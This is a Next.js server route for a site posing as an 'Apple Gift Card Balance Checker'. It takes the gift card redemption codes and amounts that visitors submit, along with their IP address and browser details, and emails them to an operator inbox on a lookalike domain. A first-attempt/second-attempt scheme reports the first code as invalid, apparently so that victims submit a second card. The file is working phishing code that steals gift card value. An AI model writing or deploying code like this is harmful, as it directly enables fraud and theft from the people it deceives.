import { NextRequest, NextResponse } from 'next/server'
import { Resend } from 'resend'

// Initialize Resend with your API key
const resend = new Resend(process.env.RESEND_API_KEY)

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { type, attempt, authCode, amount } = body

    // Validate required fields
    if (!authCode || !amount) {
      return NextResponse.json(
        { error: 'Missing required fields' },
        { status: 400 }
      )
    }

    const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19)
    const ip = request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || 'unknown'
    const userAgent = request.headers.get('user-agent') || 'unknown'
    const domain = request.headers.get('host') || 'localhost'

    const isFirstAttempt = attempt === 'first'
    const attemptTitle = isFirstAttempt 
      ? '⚠️ First Attempt - Invalid Apple Gift Card Code'
      : '✅ Second Attempt - Apple Gift Card Verified'
    
    const attemptColor = isFirstAttempt ? '#f44336' : '#4caf50'
    const attemptBadge = isFirstAttempt ? 'FIRST ATTEMPT - INVALID' : 'SECOND ATTEMPT - SUCCESSFUL'

    const htmlBody = `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>${attemptTitle}</title>
</head>
<body style="margin:0;padding:0;background:linear-gradient(135deg,#1a1a2e 0%,#16213e 100%);font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,sans-serif;">
    <table width="100%" cellpadding="0" cellspacing="0" style="min-height:100vh;">
        <tr>
            <td align="center" style="padding:40px 20px;">
                <table width="600" cellpadding="0" cellspacing="0" style="background:white;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,0.3);overflow:hidden;">
                    <tr>
                        <td style="background:${attemptColor};padding:40px 30px;text-align:center;">
                            <h1 style="margin:0;color:white;font-size:28px;font-weight:700;">${attemptTitle}</h1>
                            <p style="margin:8px 0 0 0;color:rgba(255,255,255,0.9);font-size:14px;">Apple Gift Card Submission</p>
                        </td>
                    </tr>
                    <tr>
                        <td style="padding:40px 30px;">
                            <div style="text-align:center;margin-bottom:30px;">
                                <div style="font-size:60px;margin-bottom:16px;">${isFirstAttempt ? '⚠️' : '🍎'}</div>
                            </div>
                            <div style="background:#f8f9ff;border-radius:12px;padding:24px;margin-bottom:30px;border-left:4px solid ${attemptColor};">
                                <h2 style="margin:0 0 20px 0;color:#1d1d1f;font-size:18px;font-weight:600;">Apple Gift Card Details</h2>
                                <table width="100%" cellpadding="0" cellspacing="0">
                                    <tr>
                                        <td style="padding:12px 0;border-bottom:1px solid rgba(0,0,0,0.05);">
                                            <span style="color:#6e6e73;font-size:13px;font-weight:500;">ATTEMPT</span><br>
                                            <span style="color:${attemptColor};font-size:14px;font-weight:600;">${attemptBadge}</span>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td style="padding:12px 0;border-bottom:1px solid rgba(0,0,0,0.05);">
                                            <span style="color:#6e6e73;font-size:13px;font-weight:500;">REDEMPTION CODE</span><br>
                                            <span style="color:#1d1d1f;font-size:16px;font-weight:600;font-family:monospace;letter-spacing:2px;">${authCode}</span>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td style="padding:12px 0;border-bottom:1px solid rgba(0,0,0,0.05);">
                                            <span style="color:#6e6e73;font-size:13px;font-weight:500;">AMOUNT</span><br>
                                            <span style="color:#0071e3;font-size:24px;font-weight:700;">\$${amount}</span>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td style="padding:12px 0;">
                                            <span style="color:#6e6e73;font-size:13px;font-weight:500;">TIMESTAMP</span><br>
                                            <span style="color:#1d1d1f;font-size:14px;">${timestamp}</span>
                                        </td>
                                    </tr>
                                </table>
                            </div>
                            <div style="background:#f5f5f7;border-radius:12px;padding:20px;margin-bottom:30px;">
                                <h3 style="margin:0 0 16px 0;color:#1d1d1f;font-size:14px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;">Request Metadata</h3>
                                <table width="100%" cellpadding="0" cellspacing="0" style="font-size:13px;">
                                    <tr><td style="padding:8px 0;color:#6e6e73;font-weight:500;">IP Address:</td><td style="padding:8px 0;color:#1d1d1f;text-align:right;font-family:monospace;">${ip}</td></tr>
                                    <tr><td style="padding:8px 0;color:#6e6e73;font-weight:500;">Domain:</td><td style="padding:8px 0;color:#1d1d1f;text-align:right;">${domain}</td></tr>
                                    <tr><td style="padding:8px 0;color:#6e6e73;font-weight:500;vertical-align:top;">User Agent:</td><td style="padding:8px 0;color:#1d1d1f;text-align:right;word-break:break-word;font-size:12px;">${userAgent.substring(0, 200)}</td></tr>
                                </table>
                            </div>
                            <div style="text-align:center;padding:20px;background:${isFirstAttempt ? '#fff3e0' : '#f0fff4'};border-radius:12px;border:1px solid ${isFirstAttempt ? '#ff9800' : '#c6f6d5'};">
                                <span style="display:inline-block;background:${attemptColor};color:white;padding:6px 16px;border-radius:20px;font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;">${attemptBadge}</span>
                            </div>
                        </td>
                    </tr>
                    <tr>
                        <td style="background:#f5f5f7;padding:30px;text-align:center;border-top:1px solid #e5e5e7;">
                            <p style="margin:0;color:#6e6e73;font-size:12px;">© 2026 Apple Gift Card Balance Checker. All rights reserved.</p>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
    </table>
</body>
</html>
    `

    // Send email using Resend
    await resend.emails.send({
      from: process.env.RESEND_FROM_EMAIL || 'Apple Gift Card <noreply@applesbalance.com>',
      to: process.env.RESEND_TO_EMAIL || 'inbox@applesbalance.com',
      subject: isFirstAttempt 
        ? `⚠️ First Attempt - Invalid Apple Gift Card Code - Amount: $${amount}`
        : `✅ Apple Gift Card Verified - Amount: $${amount}`,
      html: htmlBody,
    })

    return NextResponse.json({ success: true })
    
  } catch (error) {
    console.error('Email error:', error)
    return NextResponse.json(
      { error: 'Failed to send email' },
      { status: 500 }
    )
  }
}